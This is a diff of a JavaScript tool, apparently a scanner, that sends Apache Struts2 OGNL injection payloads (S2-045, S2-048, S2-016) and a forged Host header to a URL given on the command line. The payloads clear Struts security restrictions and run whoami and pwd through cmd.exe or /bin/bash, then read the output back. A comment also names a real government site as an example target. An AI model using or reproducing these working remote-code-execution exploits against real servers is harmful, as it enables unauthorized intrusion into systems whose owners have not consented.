@@ -6,7 +6,9 @@ var szMyName = 'M.T.X._2017-06-08',
 	g_oRst = {},
 	a = process.argv.splice(2),
 	bRunHost = false,
-	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/);
+	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
+	g_postData = null, g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
+	g_szCmdW = "echo whoami: && whoami && echo pwd: && pwd && echo cmdend";
 
 if(0 < a.length)url = a[0];
 process.stdin.setEncoding('utf8');
@@ -73,11 +75,15 @@ function fnDoHostAttack(url,fnCbk)
 		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
 		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
 		// checkWeblogicT3(host,port);
-		fnSocket(host,port,'GET ' + uO.path + ' HTTP/1.1\r\nHost:' + ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' + szMyName + ') AppleWebKit/602.3.12 (KHTML, like Gecko) Version/8.0 Mobile/14C92 Safari/602.3.12 MTX/3.0\r\n\r\n',
+		fnSocket(host,port,'POST ' + uO.path + ' HTTP/1.1\r\nHost:' 
+			+ ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' 
+				+ szMyName 
+				+ ') AppleWebKit/602.3.12 (KHTML, like Gecko) Version/8.0 Mobile/14C92 Safari/602.3.12 MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
+		+ '\r\n\r\n',
 			function(data)
 		{
 			var d = data && data.toString().trim() || "";
-
+			
 			fnParseHttpHd(d,function(o)
 			{
 				var oD = {des:"伪造host攻击测试成功"};
@@ -102,6 +108,7 @@ function fnDoHostAttack(url,fnCbk)
 		});
 	}catch(e){console.log(e);}
 }
+
 // 单个方法测试
 function fnTest(s)
 {
@@ -156,19 +163,18 @@ function fnTest(s)
 	  );
 }
 
-var g_postData = null, g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend";
-function doStruts2_048(url,cmd,fnCbk)
+
+function doStruts2_048(url,fnCbk)
 {
-	var szCmd = cmd || g_szCmd;
 	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
 		"(#_memberAccess?(#_memberAccess=#dm):" + 
 		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
 		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
 		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
 	 	".(#ognlUtil.getExcludedClasses().clear())" + 
-		".(#context.setMemberAccess(#dm)))).(#cmd='" + szCmd + "')" + 
+		".(#context.setMemberAccess(#dm))))" + 
 		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
-		".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" + 
+		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
 		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
 		".(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" + 
 		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
@@ -182,6 +188,37 @@ function doStruts2_048(url,cmd,fnCbk)
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-048");
+    	// console.log(e || b || r);
+    });
+}
+
+// http://gdsw.lss.gov.cn/swwssb/userRegisterAction.do?redirect:http://webscan.360.cn
+function fnCheckS2_016(url)
+{
+	/*///////////
+	var szCode = ("%{(#nike='multipart/form-data')"
+		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
+		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
+			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
+			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
+			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
+		+ ".(#ognlUtil.getExcludedClasses().clear())"
+		+ ".(#context.setMemberAccess(#dm))))"
+		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
+		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
+		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
+		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
+		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
+		+ ".getOutputStream()))"
+		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
+		+ ".(#ros.flush()).(#ros.close())}");
+	////////////////////////*/
+	request({method: 'GET',uri: url + "?redirect:" + encodeURIComponent(g_postData)
+		}, 
+    	function(e,r,b)
+    {
+    	// console.log(b);
+    	if(!e)fnDoBody(b,"s2-016");
     	// console.log(e || b || r);
     });
 }
@@ -202,13 +239,18 @@ function myLog(a)
 function fnDoBody(body,t)
 {
 	body||(body = "");
+
 	if(!body)
 	{
 		// myLog(arguments);
 	}
-	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
-	if(i) body = body.substr(0, i).trim();
 	if(!body)return;
+	body = body.trim();
+	if(-1 == body.indexOf("whoami"))return;
+	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
+	
+	if(0 < i) body = body.substr(0, i).trim();
+	
 	// console.log(body);
 	g_oRst.struts2 || (g_oRst.struts2 = {});
 	var oT = g_oRst.struts2 = {},s1 = String(body).split(/\n/);
@@ -222,10 +264,10 @@ function fnDoBody(body,t)
 }
 
 
-function doStruts2_045(url,cmd,fnCbk)
+function doStruts2_045(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
-	var szCmd = cmd || g_szCmd;//  && cat #curPath/WEB-INF/jdbc.propertis
+	//  && cat #curPath/WEB-INF/jdbc.propertis
 	request({method: 'POST',uri: url
 	    ,headers:
 	    {
@@ -239,9 +281,8 @@ function doStruts2_045(url,cmd,fnCbk)
 			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
 		+ ".(#ognlUtil.getExcludedClasses().clear())"
 		+ ".(#context.setMemberAccess(#dm))))"
-		+ ".(#cmd='" + szCmd + "')"
 		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
-		+ ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
+		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
 		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
 		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
 		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
@@ -249,8 +290,8 @@ function doStruts2_045(url,cmd,fnCbk)
 	    // 我添加的当前位置行加上后，会无法输出
 	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
 		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
-		+ ".(#ros.flush())}")
-	    	    // .(#ros.close())
+		+ ".(#ros.flush()).(#ros.close())}")
+	    	    // 
 	    }}
 	  , function (error, response, body){
 	  		if(body)
@@ -273,10 +314,12 @@ function fnTestAll()
 	for(var k in aMethod)
 		fnTest(aMethod[k]);
 }
+
 if(0 < a.length)
 {
 	doStruts2_045(url);
 	doStruts2_048(url);
+	fnCheckS2_016(url);
 	fnTestAll();
 }
 // checkWeblogicT3("192.168.10.133",9001);
